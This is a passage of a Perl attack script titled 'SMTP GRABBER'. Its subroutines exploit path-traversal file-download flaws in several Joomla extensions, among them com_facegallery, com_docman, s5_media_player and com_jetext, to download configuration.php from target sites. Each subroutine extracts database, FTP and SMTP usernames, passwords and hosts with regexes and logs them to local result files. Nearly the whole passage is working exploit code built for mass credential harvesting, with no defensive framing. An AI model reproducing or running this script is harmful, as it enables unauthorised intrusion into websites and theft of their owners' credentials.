print color('bold white on_red'),"SMTP GRABBER 6";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_facegallery##############################################
####################################################################################################
sub comfacegallery(){
$conflink = "$site/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 7";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_facegallery] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 7";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################s5_media_player##############################################
####################################################################################################
sub s5mediaplayer(){
$conflink = "$site/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 8";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[s5_media_player] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 8";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_docman##############################################
####################################################################################################
sub comdocman(){
$conflink = "$site/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 9";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_docman] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 9";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################mod_dvfoldercontent##############################################
####################################################################################################
sub moddvfoldercontent(){
$conflink = "$site/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 10";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[mod_dvfoldercontent] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 10";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_addproperty##############################################
####################################################################################################
sub comaddproperty(){
$conflink = "$site/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 11";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_addproperty] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 11";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_contushdvideoshare##############################################
####################################################################################################
sub comcontushdvideoshare(){
$conflink = "$site/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 12";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_contushdvideoshare] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 12";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_jetext##############################################
####################################################################################################
sub comjetext(){
$conflink = "$site/index.php?option=com_jetext&task=download&file=../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 13";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_jetext] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
